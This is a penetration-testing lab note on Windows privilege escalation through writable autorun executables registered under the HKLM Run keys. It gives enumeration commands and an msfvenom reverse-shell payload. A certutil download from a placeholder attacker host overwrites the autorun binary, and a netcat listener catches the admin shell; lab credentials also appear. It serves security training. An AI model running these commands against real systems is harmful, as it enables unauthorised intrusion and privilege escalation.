# LAB — Registry Attacks: Autorun

> [!summary] Quick Recall
> Programs configured in `Run`/`RunOnce` registry keys execute automatically at boot/login. If a low-privileged user has **write access** to the autorun executable file, they can replace it with a reverse shell payload. When an **administrator logs in**, the payload executes under admin context → **privilege escalation**.

---

## Concept

- Certain programs start automatically when the system boots (typically update services, security tools)
- These autorun entries are stored in Registry keys under `HKLM\...\Run`
- The key specifies which executable runs at startup for **all users** (machine-level)
- If `Everyone` or your user group has **Full Access (F)** to the executable → you can overwrite it

### Attack Flow

```
Enumerate autorun keys → Check file permissions on each executable →
Find writable binary → Replace with reverse shell payload →
Wait for admin login → Catch elevated shell
```

---

## Enumeration

### Step 1: Query Autorun Registry Keys

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

**Example output:**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
```

### Step 2: Check Write Access on Each Executable

Use `icacls` or `accesschk` to inspect file permissions:

```cmd
icacls <directory/file>
accesschk.exe -accepteula -wuqv [file]
```

**Check SecurityHealth (not writable):**

```cmd
icacls %windir%\system32\SecurityHealthSystray.exe
```

```
C:\Windows\system32\SecurityHealthSystray.exe NT SERVICE\TrustedInstaller:(F)
                                              BUILTIN\Administrators:(RX)
                                              NT AUTHORITY\SYSTEM:(RX)
                                              BUILTIN\Users:(RX)
```

> Users only have Read & Execute — **cannot overwrite**.

**Check My Program (writable!):**

```cmd
icacls "C:\Program Files\Autorun Program\program.exe"
```

```
C:\Program Files\Autorun Program\program.exe Everyone:(F)
                                             NT AUTHORITY\SYSTEM:(F)
                                             BUILTIN\Administrators:(F)
```

> `Everyone` has **Full Access (F)** — any user can overwrite this binary!

## Exploitation

### Step 3: Generate Reverse Shell Payload

On Kali (use [revshells.com](https://www.revshells.com/) → msfvenom → Windows Stageless Reverse TCP x64):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o reverse.exe
```

### Step 4: Start Listener on Kali

```bash
rlwrap -cAr nc -lvnp 4444
```

### Step 5: Transfer Payload & Overwrite the Autorun Binary

Host payload on Kali:

```bash
python3 -m http.server 8000
```

Download directly to the autorun path on Windows (overwrites the original):

```cmd
certutil -f -urlcache http://<KALI_IP>:8000/reverse.exe "C:\Program Files\Autorun Program\program.exe"
```

### Step 6: Wait for Administrator Login

- Restart the Windows VM
- Open a new RDP session as admin to trigger the autorun:

```bash
rdesktop <TARGET_IP>
```

> [!note]
> In a real engagement, you would wait for an administrator to log in naturally. In the lab, you can simulate this by RDP-ing as admin (`admin`/`password123`).

### Step 7: Catch the Shell

The Netcat listener catches the reverse shell:

```
whoami
→ admin
```

**Privilege escalation achieved!**

---

## Key Takeaways

| Point | Detail |
| ----- | ------ |
| Registry location | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` and `RunOnce` |
| What to check | File permissions on each autorun executable (`icacls` / `accesschk`) |
| Vulnerable condition | `Everyone:(F)` or your user group has write/modify access to the binary |
| Exploit method | Replace the binary with a reverse shell payload (same filename) |
| Trigger | Any user login triggers autorun; shell runs under **that user's context** |
| Goal | Wait for **admin login** → shell runs as admin |
